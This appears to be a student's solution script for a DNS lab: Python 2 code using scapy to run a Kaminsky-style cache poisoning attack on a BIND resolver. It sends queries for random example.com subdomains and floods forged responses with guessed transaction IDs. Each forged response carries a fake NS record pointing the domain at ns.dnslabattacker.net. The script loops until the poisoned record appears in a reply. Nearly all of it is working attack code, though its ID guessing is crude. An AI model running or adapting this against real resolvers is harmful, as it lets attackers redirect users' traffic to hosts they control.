#!/usr/bin/env python2
import argparse
import socket

from scapy.all import *
from random import randint, choice
from string import ascii_lowercase, digits
from subprocess import call


parser = argparse.ArgumentParser()
parser.add_argument("--ip", help="ip address for your bind - do not use localhost", type=str, required=True)
parser.add_argument("--port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int, required=False)
parser.add_argument("--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
args = parser.parse_args()

# your bind's ip address
my_ip = args.ip
# your bind's port (DNS queries are send to this port)
my_port = args.port
# BIND's port
dns_port = args.dns_port
# port that your bind uses to send its DNS queries
my_query_port = args.query_port

'''
Generates random strings of length 10.
'''
def getRandomSubDomain():
	return ''.join(choice(ascii_lowercase + digits) for _ in range (10))

'''
Generates random 8-bit integer.
'''
def getRandomTXID():
	return randint(0, 256)

'''
Sends a UDP packet.
'''
def sendPacket(sock, packet, ip, port):
    sock.sendto(str(packet), (ip, port))

'''
Example code that sends a DNS query using scapy.
'''
def exampleSendDNSQuery():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    dnsPacket = DNS(rd=1, qd=DNSQR(qname='example.com'))
    sendPacket(sock, dnsPacket, my_ip, my_port)
    response = sock.recv(4096)
    response = DNS(response)
    print "\n***** Packet Received from Remote Server *****"
    print response.show()
    print "***** End of Remote Server Packet *****\n"

def poison():


    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    # dnsPacket = DNS(rd=1, qd=DNSQR(qname='example.com'))

    while True:
        attackDomain = getRandomSubDomain() + ".example.com"
        
        fakeQuery = DNS(rd=1, qd=DNSQR(qname=attackDomain))
        fakeResponse = DNS(qr=1, aa=1, rd=1, ra=1, qdcount=1, ancount=1, nscount=1, arcount=0, ar=None,
                           qd=DNSQR(qname=attackDomain),
                        #    I think the rdata can be just random IPv4 address
                           an=DNSRR(rrname=attackDomain, type='A', ttl=86400, rdata='1.2.3.4'),
                        #    NS record poisoned
                           ns=DNSRR(rrname="example.com", rdata="ns.dnslabattacker.net", type='NS', ttl=86400))

        sendPacket(sock, fakeQuery, my_ip, my_port)

        # trying to get a ID hit
        for i in range(88):
             fakeResponse.id = getRandomTXID()
             sendPacket(sock, fakeResponse, my_ip, my_query_port)

        # validation
        response = sock.recv(4096)
        response = DNS(response)
        
        if (response and response[DNS].ns[DNSRR].rdata == "ns.dnslabattacker.net."):
            #print("you fking did it") 
            break

        # print("trying again")

if __name__ == '__main__':
    # exampleSendDNSQuery()
    poison()
